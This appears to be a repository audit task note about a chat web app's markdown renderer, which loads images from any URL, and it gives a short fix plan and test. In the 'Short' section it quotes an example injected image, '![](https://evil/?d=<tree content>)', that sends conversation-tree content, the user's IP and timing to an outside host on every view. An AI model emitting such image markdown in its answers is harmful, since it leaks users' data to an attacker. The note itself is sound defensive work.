# Task 14: Images in answers load from any URL

Priority: **Should fix** (data leak channel). Source: repo audit, 2026-10-17.

## Now

1. Developer: render `<img>` only for attachments in `Img` (`web/src/components/chat/Markdown.tsx:325-330`). About 10 minutes.
2. Developer: add one test in `Markdown.test.tsx`. About 10 minutes.

## Short

- Markdown images become real `<img>` tags; the page has no CSP.
- An injected `![](https://evil/?d=<tree content>)` loads on every view of the node, even while streaming.
- It leaks tree content, the user's IP and timing, again and again.
- Server-side `WebFetch` can leak once; this repeats.

## Where

`web/src/components/chat/Markdown.tsx:325-330` (`Img`)

## Fix

Keep the `AttachmentImage` branch. For any other `src`, render a link to the URL (with `target="_blank" rel="noopener noreferrer"`) instead of `<img>`.

## Done when

`![x](https://example.com/a.png)` renders no `<img>`; an attachment image still renders.

## Next

Open `web/src/components/chat/Markdown.tsx` at line 325.
